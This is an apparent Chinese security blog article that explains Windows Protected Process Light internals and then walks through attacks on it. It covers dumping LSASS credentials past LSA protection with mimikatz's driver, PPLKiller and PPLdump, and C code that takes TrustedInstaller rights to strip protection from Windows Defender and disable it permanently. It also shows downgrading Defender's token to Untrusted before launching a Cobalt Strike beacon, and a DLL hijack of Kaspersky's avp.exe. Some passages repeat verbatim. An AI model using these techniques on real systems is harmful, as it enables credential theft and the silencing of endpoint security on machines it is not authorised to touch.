![1652067557_62788ce5b3c4025887566.png!small?1652067559369](https://image.3001.net/images/20220509/1652067557_62788ce5b3c4025887566.png!small?1652067559369)

## PP/PPL(s)背景概念

首先，PPL表示Protected Process Light，但在此之前，只有Protected Processes。受保护进程的概念是随Windows
Vista / Server 2008引入的，其目的不是保护您的数据或凭据。其最初目标是保护媒体内容并遵守DRM（数字版权管理）要求。Microsoft
开发了这种机制，以便您的媒体播放器可以读取例如蓝光，同时防止您复制其内容。当时的要求是镜像文件（即可执行文件）必须使用特殊的 Windows Media
证书进行数字签名（如Windows Internals的“受保护的进程”部分中所述<https://docs.microsoft.com/en-us/sysinternals/resources/windows-internals>）。

实际上，受保护的进程只能由具有非常有限的权限的未受保护进程访问：PROCESS_QUERY_LIMITED_INFORMATION、PROCESS_SET_LIMITED_INFORMATION和。对于一些高度敏感的过程，这个集合甚至可以减少。PROCESS_TERMINATEPROCESS_SUSPEND_RESUME

几年后，从Windows 8.1 / Server 2012 R2开始，Microsoft 引入了Protected Process
Light的概念。PPL实际上是对之前Protected Process模型的扩展，增加了“Protection
level”的概念，这基本上意味着一些PP(L)进程可以比其他进程受到更多的保护。

当 PP 模型首次与 Windows Vista 一起引入时，进程要么受到保护，要么不受保护。然后，从 Windows 8.1 开始，PPL
模型扩展了这一概念并引入了保护级别。直接后果是一些 PP(L)
现在可以比其他的受到更多保护。最基本的规则是，未受保护的进程只能使用一组非常受限的访问标志打开受保护的进程，例如PROCESS_QUERY_LIMITED_INFORMATION.
如果他们请求更高级别的访问权限，系统将返回错误。Accessis Denied

对于 PP(L)s，它有点复杂。他们可以请求的访问级别取决于他们自己的保护级别。此保护级别部分由文件数字证书中的特殊 EKU
字段确定。创建受保护进程时，保护信息存储在EPROCESS内核结构中的特殊值中。此值存储保护级别（PP 或
PPL）和签名者类型（例如：反恶意软件、Lsa、WinTcb 等）。签名者类型在 PP(L) 之间建立了一种层次结构。

最基本的规则是，未受保护的进程只能使用一组非常受限的访问标志打开受保护的进程，例如PROCESS_QUERY_LIMITED_INFORMATION.
如果他们请求更高级别的访问权限，系统将返回错误。Accessis Denied。

当 PP 模型首次与 Windows Vista 一起引入时，进程要么受到保护，要么不受保护。然后，从 Windows 8.1 开始，PPL
模型扩展了这一概念并引入了保护级别。直接后果是一些 PP(L)
现在可以比其他的受到更多保护。最基本的规则是，未受保护的进程只能使用一组非常受限的访问标志打开受保护的进程，例如PROCESS_QUERY_LIMITED_INFORMATION.
如果他们请求更高级别的访问权限，系统将返回错误。Accessis Denied

对于 PP(L)s，它有点复杂。他们可以请求的访问级别取决于他们自己的保护级别。此保护级别部分由文件数字证书中的特殊 EKU
字段确定。创建受保护进程时，保护信息存储在EPROCESS内核结构中的特殊值中。此值存储保护级别（PP 或 PPL）和Signer类型（例如：
PsProtectedSignerAntimalware 、Lsa、WinTcb 等）。Signer类型在 PP(L) 之间建立了一种层次结构。以下是适用于
PP(L) 的基本规则：

## PPl(s)基本概念

### 定义保护级别

#### Protected Process Light的内部结构

<https://docs.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess>

在windows中，EPROCESS结构现在具有以下类型的"保护"字段：

  

> _PS_PROTECTION
>
> +0x000 Level : UChar
>
> +0x000 Type : Pos 0, 3 Bits
>
> +0x000 Audit : Pos 3, 1 Bit
>
> +0x000 Signer : Pos 4, 4 Bits

其中Type定义进程是 PP 还是 PPL，Type的值可以是以下之一：

> _PS_PROTECTED_TYPE
>
> PsProtectedTypeNone = 0n0
>
> PsProtectedTypeProtectedLight = 0n1
>
> PsProtectedTypeProtected = 0n2
>
> PsProtectedTypeMax = 0n3

Signer即实际保护级别,Signer的值可以是以下之一：

> _PS_PROTECTED_SIGNER
>
> PsProtectedSignerNone = 0n0
>
> PsProtectedSignerAuthenticode = 0n1
>
> PsProtectedSignerCodeGen = 0n2
>
> PsProtectedSignerAntimalware = 0n3
>
> PsProtectedSignerLsa = 0n4
>
> PsProtectedSignerWindows = 0n5
>
> PsProtectedSignerWinTcb = 0n6
>
> PsProtectedSignerMax = 0n7

![1652066197_627887952caeea3ed2270.png!small?1652066198866](https://image.3001.net/images/20220509/1652066197_627887952caeea3ed2270.png!small?1652066198866)

### 保护级别组合

进程的保护级别由这两个值的组合定义。下表列出了最常见的组合。

![1652066580_62788914024025e98aef2.png!small?1652066581684](https://image.3001.net/images/20220509/1652066580_62788914024025e98aef2.png!small?1652066581684)

###  **Signer类型**

在Protected Processes的早期，保护级别是二进制的，一个进程要么受保护，要么不受保护。当 Windows NT 6.3 引入 PPL
时，PP 和 PPL 现在都具有由Signer级别确定的保护级别，那么我们需要了解如何确定Signer类型和保护级别。

Signer级别通常由文件数字证书中的一个特殊字段确定：增强型密钥使用 (EKU)。

![1652066222_627887ae39ebe2936d019.png!small?1652066224104](https://image.3001.net/images/20220509/1652066222_627887ae39ebe2936d019.png!small?1652066224104)

### 保护优先级

[在Windows Internals 7th Edition Part 1](https://docs.microsoft.com/en-us/sysinternals/resources/windows-internals)的“ Protected Process Light
(PPL)部分，我们可以看到以下内容：

  

> When interpreting the power of a process, keep in mind that first, protected
> processes always trump PPLs, and that next, higher-value signer processes
> have access to lower ones, but not vice versa.

如果它的Signer级别大于或等于,那么一个PP 可以打开一个 PP 或具有完全访问权限的 PPL

如果它的Signer级别大于或等于,那么一个 PPL 可以打开另一个具有完全访问权限的 PPL

PPL 无法打开具有完全访问权限的 PP，无论其Signer级别如何

![1652066271_627887df0847b690425c9.png!small?1652066272834](https://image.3001.net/images/20220509/1652066271_627887df0847b690425c9.png!small?1652066272834)

 **例如**

wininit.exe– 会话 0 初始化

lsass.exe– LSASS 流程

MsMpEng.exe– Windows Defender 服务

![1652066291_627887f333746e3424e9b.png!small?1652066293070](https://image.3001.net/images/20220509/1652066291_627887f333746e3424e9b.png!small?1652066293070)

保护级别分别为

![1652066523_627888dbd3583b73a511d.png!small?1652066525453](https://image.3001.net/images/20220509/1652066523_627888dbd3583b73a511d.png!small?1652066525453)

这 3 个 PPL 的是NT AUTHORITY\SYSTEM运行，那么也是具有相同的SeDebugPrivilege权限，那么我们可以直接分析保护级别

wininit.exesigner type为WinTcb，它是 PPL
的最高可能值，那么它可以访问其他两个进程。然后，lsass.exe可以访问MsMpEng.exe，因为signer级别Lsa高于Antimalware。最后，MsMpEng.exe不能访问其他两个进程，因为它具有最低级别。不能访问其他两个进程，因为它具有最低级别。

例如，当 LSA 保护启用时，作为 PPL 执行，可以将使用Process Explorer观察保护级别：PsProtectedSignerLsa-Light

![1652066344_62788828d0bb786b75c6e.png!small?1652066348723](https://image.3001.net/images/20220509/1652066344_62788828d0bb786b75c6e.png!small?1652066348723)

如果需要访问它的内存，那么需要调用并指定访问标志。如果调用的进程不受保护，则无论用户的权限如何，此调用都会立即失败并出现错误：

![1652066359_62788837888736ab32897.png!small?1652066361210](https://image.3001.net/images/20220509/1652066359_62788837888736ab32897.png!small?1652066361210)

但是，如果调用进程是具有更高级别的 PPL (DeniedWinTcb例如），相同的调用会成功（只要用户具有适当的权限）

![1652066371_62788843707e96987622a.png!small?1652066373211](https://image.3001.net/images/20220509/1652066371_62788843707e96987622a.png!small?1652066373211)

### 无法杀死的进程

具有属于 Antimalware、Lsa 或 WinTcb 的受保护签名者的进程仅授予 0×3800 (~0xFC7FF) - 换句话说，禁止
PROCESS_TERMINATE
权限。而对于禁止PROCESS_TERMINATE的同一个组，我们也可以看到THREAD_SUSPEND_RESUME也被禁止了。

![1652066402_62788862b75880deabdf7.png!small?1652066404406](https://image.3001.net/images/20220509/1652066402_62788862b75880deabdf7.png!small?1652066404406)

![1652066413_6278886d5dbe9d022727d.png!small?1652066415544](https://image.3001.net/images/20220509/1652066413_6278886d5dbe9d022727d.png!small?1652066415544)

这里攻击PPl的主要为在渗透测试中比较常见的难点，例如Lsass的dump密码和AV,EDR的绕过和破坏。

# 攻击PPL的Lsass进程

这里主要讨论lsass中开启了PPL之后dump密码的手法。

在微软文档中我们可以使用以下方法知道：

1.以管理员身份打开注册表编辑器( )；regedit.exe

2.打开钥匙HKLM\SYSTEM\CurrentControlSet\Control\Lsa；

3.添加DWORD值RunAsPPL并将其设置为1;

4.重启。

如果在AD域环境中为：

  1. 打开组策略管理控制台 (GPMC)。
  2. 创建在域级别链接或链接到包含您的计算机帐户的组织单位的新 GPO。或者，您可以选择已部署的 GPO。
  3. 右键单击 GPO，然后单击 **编辑** 以打开组策略管理编辑器。
  4. 展开 **计算机配置** ，展开 **首选项** ，然后展开 **Windows 设置** 。
  5. 右键单击 **注册表** ，指向 **新建** ，然后单击 **注册表项** 。将出现“ **新建注册表属性** ”对话框。
  6. 在 **Hive** 列表中，单击 **HKEY_LOCAL_MACHINE** 。
  7. 在 **Key Path** 列表中，浏览至 **SYSTEM\CurrentControlSet\Control\Lsa** 。
  8. 在 **值名称** 框中，键入 **RunAsPPL** 。
  9. 在 **值类型** 框中，单击 **REG_DWORD** 。
  10. 在 **数值数据** 框中，键入 **00000001** 。
  11. 单击 **确定** 。

启用之后。lsass.exe为：

![1652066652_6278895caf2201ad16fb8.png!small?1652066654339](https://image.3001.net/images/20220509/1652066652_6278895caf2201ad16fb8.png!small?1652066654339)

同时无法对lsass的内存进行访问：

![1652066671_6278896feb13df560df0d.png!small?1652066673623](https://image.3001.net/images/20220509/1652066671_6278896feb13df560df0d.png!small?1652066673623)

### 加载驱动程序获取hash

在 Windows 中，本地用户帐户使用算法 ( NTLM ) 进行哈希处理，并存储在称为
SAM（安全帐户管理器）的数据库中，该数据库本身就是一个注册表配置文件。就像其他操作系统一样，存在各种离线和在线攻击，以获取、重置或以其他方式重用存储在
SAM 中的哈希值。

本地安全机构 (LSASS) 的进程管理此信息的运行时状态，并最终负责所有登录操作（包括通过 Active Directory
进行的远程登录）。一般来说我们在渗透测试中都会使用minikatz对lsass.exe进行dump密码的操作。

![1652066707_62788993284ac3a4107b0.png!small?1652066708883](https://image.3001.net/images/20220509/1652066707_62788993284ac3a4107b0.png!small?1652066708883)

Mimikatzprivilege::debug中的命令成功启用；SeDebugPrivilege，但是该命令sekurlsa::logonpasswords失败并出现错误代码0x00000005，从minikatz代码kuhl_m_sekurlsa_acquireLSA()函数中我们可以简单了解为

>
> <https://github.com/gentilkiwi/mimikatz/blob/fe4e98405589e96ed6de5e05ce3c872f8108c0a0/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c>

> HANDLE hData = NULL;
>
> DWORD pid;
>
> DWORD processRights = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION;
>
> kull_m_process_getProcessIdForName(L"lsass.exe", &pid);
>
> hData = OpenProcess(processRights, FALSE, pid);
>
> if (hData && hData != INVALID_HANDLE_VALUE) {
>
> // if OpenProcess OK
>
> } else {
>
> PRINT_ERROR_AUTO(L"Handle on memory");
>
> }

我们在之前的截图中可以看到，这个函数失败了，错误代码就是“访问被拒绝”。这证实，一旦启用，即使是管理员也无法使用所需的访问标志打开。

![1652066730_627889aa3a1a56fc57266.png!small?1652066731955](https://image.3001.net/images/20220509/1652066730_627889aa3a1a56fc57266.png!small?1652066731955)

在[Mimikatz](https://github.com/gentilkiwi/mimikatz)中使用数字签名的驱动程序来删除内核中 Process
对象的保护标志

![1652066741_627889b5b11b9df3c2f91.png!small?1652066743466](https://image.3001.net/images/20220509/1652066741_627889b5b11b9df3c2f91.png!small?1652066743466)

minikatz安装驱动程序

> mimikatz # !+
>
> [*] 'mimidrv' service not present
>
> [+] 'mimidrv' service successfully registered
>
> [+] 'mimidrv' service ACL to everyone
>
> [+] 'mimidrv' service started

![1652066759_627889c76672902f05a92.png!small?1652066761173](https://image.3001.net/images/20220509/1652066759_627889c76672902f05a92.png!small?1652066761173)

使用命令!processprotect删除保护

![1652066770_627889d29b63347ef4abb.png!small?1652066772231](https://image.3001.net/images/20220509/1652066770_627889d29b63347ef4abb.png!small?1652066772231)

同时我们在进程中也是可以访问到lsass.exe的句柄

![1652066816_62788a0049397ddf1cec7.png!small?1652066818091](https://image.3001.net/images/20220509/1652066816_62788a0049397ddf1cec7.png!small?1652066818091)

dump lsass.exe密码

![1652066829_62788a0dcffaeca9d97fb.png!small?1652066831603](https://image.3001.net/images/20220509/1652066829_62788a0dcffaeca9d97fb.png!small?1652066831603)

### 通过修补 EPROCESS 内核结构禁用 LSASS 进程上的 PPL 标志

> <https://redcursor.com.au/bypassing-lsa-protection-aka-protected-process-> light-without-mimikatz-on-windows-10/>

我们需要找到LSASS
EPROCESS结构的地址并将5个值修补：SignatureLevel、SectionSignatureLevel、Type、Audit 和
Signer为零。

该EnumDeviceDrivers函数可用于泄漏内核基地址。这可用于定位指向系统进程的EPROCESS结构的PsInitialSystemProcess。由于内核将进程存储在链表中，因此可以使用EPROCESS结构的
ActiveProcessLinks成员来迭代链表并找到LSASS。

如果我们查看EPROCESS结构（参见下图），我们可以看到我们需要修补的5个字段都按惯例对齐成连续的4个字节。这让我们可以在单个4字节写入中修补EPROCESS结构，

如下所示：

> WriteMemoryPrimitive(
>
> Device,
>
> 4,
>
> CurrentProcessAddress+SignatureLevelOffset,
>
> 0x00
>
> );

![1652066884_62788a44eff783b0aa4e9.png!small?1652066886665](https://image.3001.net/images/20220509/1652066884_62788a44eff783b0aa4e9.png!small?1652066886665)

那么可以移除PPL，然后就可以使用任何Dump LSASS方法，例如MimiKatz、MiniDumpWriteDump API调用等。

POC：

> <https://github.com/RedCursorSecurityConsulting/PPLKiller>
>
> PPLKiller version 0.3 by @aceb0nd
>
> Usage: PPLKiller.exe
>
> [/disablePPL <PID>]
>
> [/disableLSAProtection]
>
> [/makeSYSTEM <PID>]
>
> [/makeSYSTEMcmd]
>
> [/installDriver]
>
> [/uninstallDriver]

![1652066935_62788a77ac9d6a5d3e200.png!small?1652066937351](https://image.3001.net/images/20220509/1652066935_62788a77ac9d6a5d3e200.png!small?1652066937351)

运行PPLKiller.exe /installDriver安装驱动程序；

![1652066944_62788a80b6306dcd9dd97.png!small?1652066946384](https://image.3001.net/images/20220509/1652066944_62788a80b6306dcd9dd97.png!small?1652066946384)

进行攻击，PPLKiller.exe /disableLSAProtection；

![1652066955_62788a8b2cf5d33100b3b.png!small?1652066956778](https://image.3001.net/images/20220509/1652066955_62788a8b2cf5d33100b3b.png!small?1652066956778)![1652066966_62788a96a6570da0793e5.png!small?1652066968325](https://image.3001.net/images/20220509/1652066966_62788a96a6570da0793e5.png!small?1652066968325)

PP(L) 模型有效地防止未受保护的进程使用OpenProcess例如扩展访问权限访问受保护的进程。

### 滥用 DefineDosDevice API

函数的原型：

> DefineDosDevice
>
> BOOL DefineDosDeviceW(
>
> DWORD dwFlags,
>
> LPCWSTR lpDeviceName,
>
> LPCWSTR lpTargetPath
>
> );
>
> <https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-> definedosdevicew>

可以定义、重新定义或删除 MS-DOS 设备名称。

具体利用分析手法：

> <https://googleprojectzero.blogspot.com/2018/08/windows-exploitation-tricks-> exploiting.html>

基本原理为：

使用DefineDosDeviceAPI 函数来欺骗系统创建任意已知 DLL 条目。由于 PPL 不检查已知 DLL 的数字签名，因此以后可以使用它来执行
DLL 劫持攻击并在 PPL 中执行任意代码。

> c:\Users\qax\Desktop>PPLdump.exe
>
> _____ _____ __ _
>
> | _ | _ | | _| |_ _ _____ ___
>
> | __| __| |__| . | | | | . | version 0.4
>
> |__| |__| |_____|___|___|_|_|_| _| by @itm4n
>
> |_|
>
> Description:
>
> Dump the memory of a Protected Process Light (PPL) with a *userland* exploit
>
> Usage:
>
> PPLdump.exe [-v] [-d] [-f] <PROC_NAME|PROC_ID> <DUMP_FILE>
>
> Arguments:
>
> PROC_NAME The name of a Process to dump
>
> PROC_ID The ID of a Process to dump
>
> DUMP_FILE The path of the output dump file
>
> Options:
>
> -v (Verbose) Enable verbose mode
>
> -d (Debug) Enable debug mode (implies verbose)
>
> -f (Force) Bypass DefineDosDevice error check
>
> Examples:
>
> PPLdump.exe lsass.exe lsass.dmp
>
> PPLdump.exe -v 720 out.dmp
>
> dump lsass.exe
>
> .\PPLdump.exe -v lsass.exe lsass.dmp

![1652067024_62788ad0efc08cb918dda.png!small?1652067026795](https://image.3001.net/images/20220509/1652067024_62788ad0efc08cb918dda.png!small?1652067026795)

# 攻击PPL的Antimalware

在微软文档中被称为Protecting Anti-Malware Services(保护反恶意软件服务)

要使反恶意软件用户模式服务作为受保护的服务运行，反恶意软件供应商必须在 Windows 计算机上安装 ELAM 驱动程序。除了现有的 ELAM
驱动程序认证要求外，驱动程序必须有一个嵌入的资源部分，其中包含用于签署用户模式服务二进制文件的证书信息。

在启动过程中，将从 ELAM 驱动程序中提取此资源部分以验证证书信息并注册反恶意软件服务。反恶意软件服务也可以在反恶意软件安装过程中通过调用特殊的 API
进行注册，如本文档后面所述。

从 ELAM
驱动程序成功提取资源部分并注册用户模式服务后，允许该服务作为受保护服务启动。服务作为受保护启动后，系统上的其他非受保护进程将无法注入线程，也不会允许它们写入受保护进程的虚拟内存。

此外，加载到受保护进程中的任何非 Windows DLL 都必须使用适当的证书进行签名。

> <https://web.archive.org/web/20211019010629/https://docs.microsoft.com/en-> us/windows/win32/services/protecting-anti-malware-services->

为了能够作为PPL运行，反恶意软件供应商必须向 Microsoft 申请、证明其身份、签署具有约束力的法律文件、实施Early Launch Anti-Malware ( ELAM ) 驱动程序、通过测试套件运行并提交向 Microsoft 索取特殊的 Authenticode
签名。这不是一个简单的过程。此过程完成后，供应商可以使用此ELAM驱动程序让 Windows 通过将其作为PPL运行来保护其反恶意软件服务。

例如:

Windows Defender

![1652067079_62788b07b02162ea0ff5d.png!small?1652067081373](https://image.3001.net/images/20220509/1652067079_62788b07b02162ea0ff5d.png!small?1652067081373)

ESET Security

![1652067088_62788b109c909de4ad472.png!small?1652067090332](https://image.3001.net/images/20220509/1652067088_62788b109c909de4ad472.png!small?1652067090332)

即使以 SYSTEM（或提升的管理员）身份运行的用户SeDebugPrivilege 也无法终止PPL Windows Defender 反恶意软件服务 (
MsMpEng.exe)。这是因为非PPL进程 taskkill.exe无法使用诸如 OpenProcess之类的 API
获取具有对PPLPROCESS_TERMINATE进程的访问权限的句柄。

### 停止PPL保护破坏WDF

可以关闭Windows Defender服务并通过提升权限删除ppl保护，然后删除Windows Defender中的DLL和其他文件，使Windows
Defender服务无法运行，从而导致Windows Defender拒绝服务。

 **1.将权限升级到trustedinstaller**

我们使用受信任的安装程序组令牌自动窃取系统令牌，以提升到受信任的安装程序权限，

在这里，我们使用一个开源工具来利用它：<https://github.com/0xbadjuju/Tokenvator.>

![1652067120_62788b302c92f351b0a78.png!small?1652067121866](https://image.3001.net/images/20220509/1652067120_62788b302c92f351b0a78.png!small?1652067121866)

提权到TrustedInstaller并使用这个权限打开一个新的CMD.exe

![1652067130_62788b3a3f44166000e1a.png!small?1652067132234](https://image.3001.net/images/20220509/1652067130_62788b3a3f44166000e1a.png!small?1652067132234)

同时这个cmd.exe也拥有TrustedInstaller权限。

![1652067142_62788b46482b1d6899e57.png!small?1652067145053](https://image.3001.net/images/20220509/1652067142_62788b46482b1d6899e57.png!small?1652067145053)

 **2.关闭Windows Defender服务**

这个其实并不是漏洞，因为我们的administrator权限也可以直接临时关闭Windows Defender服务。

![1652067159_62788b57c1fb101d4f927.png!small?1652067161754](https://image.3001.net/images/20220509/1652067159_62788b57c1fb101d4f927.png!small?1652067161754)

但是这样关闭Windows Defender服务可以手工打开和重启会自动打开，我们想要的是永远关闭Windows
Defender服务，在黑客的想法中就是目标无论如何都没有办法再次启动Windows Defender服务，当然重装系统除外。哈哈哈....

 **3.移除 PsProtectSignerAntimalware-Light 保护**

在微软文档中我们可以知道：

> <https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-> changeserviceconfig2w>

只要我们对服务对象有足够的访问权限，就可以更改服务保护。也就是说我们可以关闭Windows Defender服务的PPL。经过我们测试知道服务 ACL
根本不允许 SYSTEM 用户和管理员组修改或停止 Windows Defender 服务。但它允许 WinDefend 和
TrustedInstaller 修改或停止 Windows Defender 服务的ppl，那么上面我们拥有了完整的TrustedInstaller权限。

那么我们可以禁用Windows Defender 服务的PsProtectSignerAntimalware-Light，然后可以修改和删除Windows
Defender的运行必要组件来达到使永远关闭Windows Defender服务的目的。

Windows Defender的文件保存路径为：

> C:\Program Files\Windows Defender
>
> C:\Program Files\Windows Defender Advanced Threat Protection
>
> C:\Program Files (x86)\Windows Defender

在有PPL的情况下我们无法对这些文件进行任何修改。

![1652067196_62788b7ca291ca8221806.png!small?1652067198534](https://image.3001.net/images/20220509/1652067196_62788b7ca291ca8221806.png!small?1652067198534)

同样在TrustedInstaller权限中也无法进行修改等等操作。

![1652067207_62788b875a5dedb17c163.png!small?1652067209477](https://image.3001.net/images/20220509/1652067207_62788b875a5dedb17c163.png!small?1652067209477)

那么我们可以使用TrustedInstaller权限通过ChangeServiceConfig2W来停止PsProtectSignerAntimalware-Light 保护，然后修改和删除Windows Defender的运行必要组件来达到使永远关闭Windows Defender服务的目的。

> SC_HANDLE tt = OpenSCManager(NULL, NULL, GENERIC_READ);//建立服务控制管理器的连接
>
> SC_HANDLE windefend_svc = OpenServiceW(tt, L"WinDefend", SERVICE_START |
> SERVICE_STOP | GENERIC_READ | SERVICE_CHANGE_CONFIG |
> SERVICE_USER_DEFINED_CONTROL);
>
> //打开一个已经存在的服务 打开wdf的服务
>
> if (windefend_svc == NULL) {
>
> printf("\n[-] Failed to open WinDefend service.");
>
> return 1;
>
> }
>
> printf("Done.\n");
>
> SERVICE_STATUS svc_status;
>
> if (!ControlService(windefend_svc, SERVICE_CONTROL_STOP, &svc_status)) {
>
> //停止WDF服务
>
> printf("[-] Failed to stop WinDefend service :(");
>
> return 1;
>
> }
>
> printf("[+] Successfully sent service stop control.\n");
>
> SERVICE_LAUNCH_PROTECTED_INFO info;
>
> DWORD ret_sz = 0;
>
> QueryServiceConfig2W(windefend_svc, SERVICE_CONFIG_LAUNCH_PROTECTED,
> (LPBYTE)&info, sizeof(SERVICE_LAUNCH_PROTECTED_INFO), &ret_sz);
>
> //检索WDF服务的可选配置参数。
>
> if (info.dwLaunchProtected == SERVICE_LAUNCH_PROTECTED_NONE)
>
> goto WaitDefender;
>
> info.dwLaunchProtected = SERVICE_LAUNCH_PROTECTED_NONE;
>
> if (!ChangeServiceConfig2W(windefend_svc, SERVICE_CONFIG_LAUNCH_PROTECTED,
> &info)) {
>
> printf("[-] Failed to remove PsProtectSignerAntimalware-Light from WinDefend
> service :(");
>
> return 1;
>
> }
>
> printf("[+] Successfully removed PsProtectSignerAntimalware-Light from
> WinDefend service.\n");
>
> WaitDefender:
>
> printf("[*] Waiting WinDefend to stop .!\n");
>
> WaitForSingleObject(hwindefend, INFINITE);
>
> CloseHandle(hwindefend);
>
> printf("[!] Attempting to unload WdFilter.sys ... ");

然后修改修改和删除Windows Defender的运行必要组件来达到使永远关闭Windows Defender服务的目的。

### Toke置为Untrusted

微软文档：<https://docs.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control>

 **Windows 令牌**

可以将 Windows
令牌视为安全凭证。它说明了你是谁以及你可以做什么。通常，当用户运行一个进程时，该进程使用他们的令牌运行，并且可以执行用户可以执行的任何操作。

令牌中一些最重要的数据包括：

  * User identity
  * Group membership (e.g. Administrators)
  * Privileges (e.g. SeDebugPrivilege)
  * Integrity level

令牌是 Windows 授权的关键部分。每当 Windows 线程访问安全对象时，操作系统都会执行安全检查。它将线程的有效令牌与
正在访问的对象的安全描述符进行比较。

在强制完整性控制 (MIC) 中我们知道：

> Windows defines four integrity levels: low, medium, high, and system.
> Standard users receive medium, elevated users receive high. Processes you
> start and objects you create receive your integrity level (medium or high)
> or low if the executable file's level is low; system services receive system
> integrity. Objects that lack an integrity label are treated as medium by the
> operating system; this prevents low-integrity code from modifying unlabeled
> objects. Additionally, Windows ensures that processes running with a low
> integrity level cannot obtain access to a process which is associated with
> an app container.

### 访问令牌

Windows 提供[OpenProcessToken](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken)API 以启用与进程令牌的交互。

MSDN声明必须PROCESS_QUERY_INFORMATION有权使用OpenProcessToken.
由于未受保护的进程只能PROCESS_QUERY_LIMITED_INFORMATION访问PPL进程（注意LIMITED），因此似乎不可能获得PPL进程令牌的句柄。但是，在这种情况下，
MSDN是不正确的。只有 PROCESS_QUERY_LIMITED_INFORMATION，我们也可以成功打开受保护进程的令牌。

通过Process Hacker查看 Windows Defender 的 ( MsMpEng.exe) 令牌，我们看到以下自由访问控制列表 ( DACL
)：

![1652067285_62788bd584456fba761ab.png!small?1652067287467](https://image.3001.net/images/20220509/1652067285_62788bd584456fba761ab.png!small?1652067287467)

SYSTEM 用户可以完全控制令牌。这意味着，除非有其他机制保护令牌，否则以 SYSTEM
身份运行的线程可以修改令牌,但是在windows中并没有保护令牌的机制。

在Process Hacker中我们可以看到定义的完整性为6种，MsMpfeng启动为System.

![1652067299_62788be3cbb196138e997.png!small](https://image.3001.net/images/20220509/1652067299_62788be3cbb196138e997.png!small)

其中我们需要注意的是Untrusted的，

具体Windows 完整性控制简介 ：

> [https://community.broadcom.com/symantecenterprise/communities/community-> home/librarydocuments/viewdocument?DocumentKey=2e7efdd7-def6-4b1b-995a-e68b328b6f27&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments](https://community.broadcom.com/symantecenterprise/communities/community-> home/librarydocuments/viewdocument?DocumentKey=2e7efdd7-def6-4b1b-995a-e68b328b6f27&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments)

 **Untrusted** – 匿名登录的进程被自动指定为 Untrusted

Untrusted目前主要应用在浏览器中，也就是Sandboxing，通过创建一个称为沙箱的受限安全上下文来完成的。当沙盒需要在系统上执行特权操作时，例如保存下载的文件，它可以请求非沙盒“代理”进程代表它执行操作,如果沙盒进程被利用，那么有效负载仅对沙盒可访问的资源造成损害的能力。

例如msedge浏览器的进程：

![1652067329_62788c01a16578e6623e4.png!small?1652067331385](https://image.3001.net/images/20220509/1652067329_62788c01a16578e6623e4.png!small?1652067331385)

简单来说就是如果为Untrusted，那么进程对计算机资源的访问非常有限。

使用这种技术，攻击者可以强行删除MsMpEng.exe令牌中的所有权限，并将其从系统降低到不受信任的完整性。对不受信任的完整性的削弱会阻止受害者进程访问系统上的大多数安全资源，从而在不终止进程的情况下使进程失去能力。

![1652067340_62788c0c71ab7954540f7.png!small?1652067342459](https://image.3001.net/images/20220509/1652067340_62788c0c71ab7954540f7.png!small?1652067342459)

Cobaltstrike默认生成beacon，直接上线。

![1652067353_62788c19eca7e0cf4da6f.png!small?1652067356093](https://image.3001.net/images/20220509/1652067353_62788c19eca7e0cf4da6f.png!small?1652067356093)

对于360等等也是可以这样来进行绕过和利用。

### DLL hijacking在PPL进程中执行任意代码

回看微软文档中关于Protecting Anti-Malware Services的内容时，可以看到具有这样描述的一句话：

DLL signing requirements

> As mentioned earlier, any non-Windows DLLs that get loaded into the
> protected service must be signed with the same certificate that was used to
> sign the anti-malware service.

加载到受保护服务中的任何非 Windows DLL必须使用用于签署反恶意软件服务的相同证书进行签名。 那么如果加载的是windows的DLL是否为不用签名？

这里以卡巴斯基的avp.exe进行利用

![1652067402_62788c4abca3839d12a09.png!small?1652067404407](https://image.3001.net/images/20220509/1652067402_62788c4abca3839d12a09.png!small?1652067404407)

设置好规则

![1652067411_62788c53b07708f374d70.png!small?1652067413504](https://image.3001.net/images/20220509/1652067411_62788c53b07708f374d70.png!small?1652067413504)

可以看到加载了一批windows的DLL

![1652067427_62788c63146331da277a9.png!small?1652067429810](https://image.3001.net/images/20220509/1652067427_62788c63146331da277a9.png!small?1652067429810)

后面加载的是卡巴斯基自身的DLL，我们看一下Wow64log.dll

查看一下Wow64log.dll是否在KnownDlls中

![1652067440_62788c7012f141a1f7e45.png!small?1652067441788](https://image.3001.net/images/20220509/1652067440_62788c7012f141a1f7e45.png!small?1652067441788)

wow64log.dll与 WoW64 Windows 机制有关，该机制允许在 64 位 Windows 上运行 32
位程序。该子系统会自动尝试加载它，但是它不存在于任何公共 Windows 版本中。

> C:\Windows\System (Windows 95/98/Me)  
> C:\WINNT\System32 (Windows NT/2000)  
> C:\Windows\System32 (Windows XP,Vista,7,8,10)  
> 如果是64位文件C:\Windows\SysWOW64

作为管理员，我们可以构造恶意 wow64log.dll 文件复制到 System32 。

例如：

> #include "pch.h"
>
> #include <windows.h>
>
> #include <tlhelp32.h>
>
> #include <stdio.h>
>
> #include <iostream>
>
> #include <map>
>
> BOOL APIENTRY DllMain(HMODULE hModule,
>
> DWORD ul_reason_for_call,
>
> LPVOID lpReserved
>
> )
>
> {
>
> STARTUPINFO si = { sizeof(si) };
>
> PROCESS_INFORMATION pi;
>
> CreateProcess(TEXT("C:\\\Windows\\\System32\\\calc.exe"), NULL, NULL, NULL,
> false, 0, NULL, NULL, &si, π);
>
> switch (ul_reason_for_call)
>
> {
>
> case DLL_PROCESS_ATTACH:
>
> char szFileName[MAX_PATH + 1];
>
> GetModuleFileNameA(NULL, szFileName, MAX_PATH + 1);
>
> //check if we are injected in an interesting McAfee process
>
> if (strstr(szFileName, "avp") != NULL
>
> //|| strstr(szFileName, "mcshield") != NULL
>
> || strstr(szFileName, "avp.exe") != NULL
>
> ) {
>
> DisableThreadLibraryCalls(hModule);
>
> }
>
> else
>
> {
>
> }
>
> case DLL_THREAD_ATTACH:
>
> case DLL_THREAD_DETACH:
>
> case DLL_PROCESS_DETACH:
>
> //log("detach");
>
> break;
>
> }
>
> return TRUE;
>
> }

手动复制在目标文件目录中，然后启动卡巴斯基，可以看到加载了我们的Wow64log.dll

